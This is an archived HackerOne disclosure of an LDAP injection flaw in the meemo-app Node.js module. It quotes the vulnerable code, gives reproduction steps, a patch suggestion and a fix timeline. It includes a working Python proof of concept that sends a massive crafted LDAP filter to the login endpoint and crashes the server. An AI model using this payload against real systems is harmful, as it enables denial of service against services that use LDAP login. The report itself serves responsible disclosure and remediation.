---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/ldap-injection
  - env/web
  - stack/node
  - vuln/dos
  - impact/dos-impact
substate: "resolved"
weakness: "LDAP Injection"
enriched: true
body: true
date: 2020-08-22
submitted: 2020-06-24T22:00:27.123Z
bounty_usd: null
votes: 2
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "d3lla"
source: "https://hackerone.com/reports/907311"
title: "[meemo-app] Denial of Service via LDAP Injection"
---
# [meemo-app] Denial of Service via LDAP Injection

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 2 | **Program:** Node.js third-party modules | **Disclosed:** 2020-08-22

- Report: [https://hackerone.com/reports/907311](https://hackerone.com/reports/907311)
- CWE: LDAP Injection
- Submitted: 2020-06-24T22:00:27.123Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report `Denial of service via LDAP Injection` vulnerability in `meemo-app` module.
It allows a malicious attacker to send a crafted input that is interpreted as an LDAP filter, leading to Denial of Service.

# Module

**module name:** `meemo-app`
**version:** `1.9.2`
**npm page:** `https://www.npmjs.com/package/meemo-app`

## Module Description

Meemo is a personal data manager. It lets you simply input any kind of information like notes, thoughts, ideas as well as acts as a bookmarkmanager and todo list. The user interface resembles a news feed organized with tags. Full text search further allows you to quickly find information in your pile of accumulated data.

For better bookmarking, there are chrome and firefox webextensions available.

## Module Stats

[1] weekly downloads

# Vulnerability

## Vulnerability Description

The module is vulnerable to a DoS via LDAP Injection.
The causes of this vulnerability are the same of another report here #906959.


Below the vulnerable code:

```javascript
...
function verify(username, password, callback) {
    profile(username, true, function (error, result) {
        if (error) return callback(error);

        if (process.env.CLOUDRON_LDAP_URL) {
            var ldapClient = ldapjs.createClient({ url: process.env.CLOUDRON_LDAP_URL });
            ldapClient.on('error', function (error) {
                console.error('LDAP error', error);
                callback(new UserError(UserError.INTERNAL_ERROR, error));
            });

            var ldapDn = 'cn=' + result.username + ',' + process.env.CLOUDRON_LDAP_USERS_BASE_DN;

            ldapClient.bind(ldapDn, password, function (error) {
                if (error) return callback(new UserError(UserError.NOT_AUTHORIZED));

                callback(null, { user: result });
            });
        } else {
            bcrypt.compare(password, result.passwordHash, function (error, valid) {
                if (error) return callback(new UserError(UserError.INTERNAL_ERROR, error));
                if (!valid) return callback(new UserError(UserError.NOT_AUTHORIZED));

                // strip passwordHash
                delete result.passwordHash;

                callback(null, { user: result });
            });
        }
    });
}

// https://github.com/nebulade/meemo/blob/master/src/users.js#L84
// identifier may be userId, email, username
function profile(identifier, full, callback) {
    assert.strictEqual(typeof identifier, 'string');
    assert.strictEqual(typeof full, 'boolean');
    assert.strictEqual(typeof callback, 'function');

    if (process.env.CLOUDRON_LDAP_URL) {
        var ldapClient = ldapjs.createClient({ url: process.env.CLOUDRON_LDAP_URL });
        ldapClient.on('error', function (error) {
            console.error('LDAP error', error);
        });

        ldapClient.bind(process.env.CLOUDRON_LDAP_BIND_DN, process.env.CLOUDRON_LDAP_BIND_PASSWORD, function (error) {
            if (error) return callback(new UserError(UserError.INTERNAL_ERROR, error));

            ldapClient.search(process.env.CLOUDRON_LDAP_USERS_BASE_DN, { filter: '(|(uid=' + identifier + ')(mail=' + identifier + ')(username=' + identifier + ')(sAMAccountName=' + identifier + '))' }, function (error, result) {  //<-- INJECTION: identifier is not sanitized
                if (error) return callback(new UserError(UserError.INTERNAL_ERROR, error));

                var items = [];

                result.on('searchEntry', function(entry) {
                    items.push(entry.object);
                });

                result.on('error', function (error) {
                    callback(new UserError(UserError.INTERNAL_ERROR, error));
                });

                result.on('end', function (result) {
                    if (result.status !== 0) return callback(new UserError(UserError.NOT_FOUND, 'non-zero status from LDAP search: ' + result.status));
                    if (items.length === 0) return callback(new UserError(UserError.NOT_FOUND, 'No LDAP entries found'));

                    if (full) return callback(null, items[0]);

                    var out = {
                        username: items[0].username,
                        displayName: items[0].displayname,
                        email: items[0].mail
                    };

                    callback(null, out);
                });
            });
        });
...

```

```javascript
...
exports = module.exports = {
    auth: auth,
    login: login,
    logout: logout,
    profile: profile,

...
// https://github.com/nebulade/meemo/blob/master/src/routes.js#L86
function login(req, res, next) {
    if (typeof req.body.username !== 'string' || !req.body.username) return next(new HttpError(400, 'missing username'));
    if (typeof req.body.password !== 'string' || !req.body.password) return next(new HttpError(400, 'missing password'));

    users.verify(req.body.username, req.body.password, function (error, result) {
        if (error && error.code === UserError.NOT_FOUND) return next(new HttpError(401, 'invalid credentials'));
        if (error && error.code === UserError.NOT_AUTHORIZED) return next(new HttpError(401, 'invalid credentials'));
        if (error) return next(new HttpError(500, error));

        req.session.userId = result.user.username;

        var token = uuid.v4();
        tokens.add(token, '', result.user.username, function (error) {
            if (error) return next(new HttpError(500, error));
            next(new HttpSuccess(201, { token: token, user: result.user }));
        });
    });
}
...
```

```javascript
// https://github.com/nebulade/meemo/blob/master/app.js#L55
...
router.post('/api/login', routes.login);
...
```
## Steps To Reproduce:

To test this app on a real live system, you need first to install `Cloudron` (https://cloudron.io/get.html) and then install the `Meemo` app (https://cloudron.io/store/de.nebulon.guacamoly.html). In order to install the `Cloudron` app you need first a domain. 

Instead of the above setting, I tested the app locally. 
Below steps to reproduce the vulnerability.

To simulate an LDAP server for users authentication, I used a test server provided by the same author (https://github.com/nebulade/ldapjstestserver) (you can find attached).

- install (https://docs.mongodb.com/manual/tutorial/install-mongodb-on-ubuntu/) and start MongoDB:
    - `sudo systemctl start mongod`

- create a directory for testing
    - `mkdir poc`
    - `cd poc/`

- install `meemo-app` module:
    -  `git clone https://github.com/nebulade/meemo.git`
    - `cd meemo`
    - `npm i`
    - `./node_modules/.bin/gulp`

- start the LDAP test server (we are in `poc/meemo/`):
    -  `node ldapjstestserver.js`

- start the `meemo` app locally (we need to setup some environment variables to enable the LDAP authentication):
    - `CLOUDRON_LDAP_BIND_DN="cn=admin,ou=users,dc=example" CLOUDRON_LDAP_BIND_PASSWORD="password" CLOUDRON_LDAP_USERS_BASE_DN="ou=users,dc=example" CLOUDRON_LDAP_URL="ldap://localhost:3002" node app.js`

Before performing the attack let's first check that everything works as expected:
- visit `http://localhost:3000/`
- enter `normal` and `test` respectively in the `username` and `password` fields and the click enter
- logout 

Reproduce the attack:
- visit `http://localhost:3000/`
- run the following `python` script (`poc.py`):

```python
import requests
import json

url = 'http://localhost:3000/api/login'

payload = "*)" + "(cn=*)"*700000 + "(cn=*"

print(f"Payload's length: {len(payload)} characters")

headers = {'Content-type': 'application/json', 'Accept': 'text/plain'}

data = {
    "username": payload,
    "password": "pass"
}

response = requests.post(url, data=json.dumps(data), headers=headers)
```
- the page will load until the server crashes. After some time you will get the following error:
`FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory`

If an attacker send one (like in my case) or multiple requests like in the previous example, he/she could potentially makes the service unavaible and consumes all the server resources, leading to DoS.

{F881601}

## Patch
Sanitize the user input before using it to build LDAP filters.

Possible solution could be for example this one (taken from another project):
- Github Issue: [Vulnerable to ldap injection](https://github.com/vesse/node-ldapauth-fork/issues/21)
- Github Commit: [Sanitize user input: Replace the specific special characters with codes as defined in LDAP specification.](https://github.com/vesse/node-ldapauth-fork/commit/3feea43e243698bcaeffa904a7324f4d96df60e4) 

Inspired by the same issue (https://github.com/vesse/node-ldapauth-fork/issues/21), here there are the RFC specifications (https://tools.ietf.org/search/rfc4515#section-3):
```
    The rule ensures that the entire filter string is a
    valid UTF-8 string and provides that the octets that represent the
    ASCII characters "*" (ASCII 0x2a), "(" (ASCII 0x28), ")" (ASCII
    0x29), "" (ASCII 0x5c), and NUL (ASCII 0x00) are represented as a
    backslash "" (ASCII 0x5c) followed by the two hexadecimal digits
    representing the value of the encoded octet.

    This simple escaping mechanism eliminates filter-parsing ambiguities
    and allows any filter that can be represented in LDAP to be
    represented as a NUL-terminated string. Other octets that are part
    of the set may be escaped using this mechanism, for example,
    non-printing ASCII characters.

    For AssertionValues that contain UTF-8 character data, each octet of
    the character to be escaped is replaced by a backslash and two hex
    digits, which form a single octet in the code of the character. For
    example, the filter checking whether the "cn" attribute contained a
    value with the character "" anywhere in it would be represented as
    "(cn=\2a*)".

    As indicated by the rule, implementations MUST escape
    all octets greater than 0x7F that are not part of a valid UTF-8
    encoding sequence when they generate a string representation of a
    search filter. Implementations SHOULD accept as input strings that
    are not valid UTF-8 strings. This is necessary because RFC 2254 did
    not clearly define the term "string representation" (and in
    particular did not mention that the string representation of an LDAP
    search filter is a string of UTF-8-encoded Unicode characters).
```




## Supporting Material/References:

Some helpful resources I used for this research:
- [LDAP injection](https://en.wikipedia.org/wiki/LDAP_injection)
- [LDAP Filters](https://ldap.com/ldap-filters/)
- [BlackHat: LDAP Injection & Blind LDAP Injection](https://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf)
- [Understanding and Defending Against LDAP Injection Attacks](https://ldap.com/2018/05/04/understanding-and-defending-against-ldap-injection-attacks/)
- [LDAP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html)
- [Ldapjs - orfilter](http://ldapjs.org/filters.html#orfilter)

My setup:
- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.2.0
- NPM VERSION: 6.14.4

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

Denial of service

## Timeline

- **Report Filed**
- **2020-06-27** @d3lla: Hi,
I hope everyone is staying safe :)

Is there any update?

Thank you for your patience and have a nice day,
d3lla
- **2020-08-02** @bbe8482aecd24374d13c5de15a0a6: Thanks for reporting this @d3lla. I will do the next steps today.
- **External User Joined**
- **2020-08-16** @nebulon: Thanks for reporting and inviting me here. I have fixed this now with https://github.com/nebulade/meemo/commit/be31ad3da7d4f8653d6813e84125bb4d25b5658b
- **2020-08-17** @bbe8482aecd24374d13c5de15a0a6: Thanks for providing a patch @nebulon.
@d3lla can you confirm that this resolves the issue?
- **2020-08-21** @d3lla: Hi @nebulon and @danielruf,

Sorry for my late reply.

@nebulon thanks for your prompt reply and for the fix.

Your changes seems to fix the problem.
I run the previous steps of the PoC and I was not able to reproduce the previous reported result.
I attached a PoC video.
{F958379}

Thank you for your time and have a nice day,
d3lla

I tested using the following configurations:
- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.2.0
- NPM VERSION: 6.14.4
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
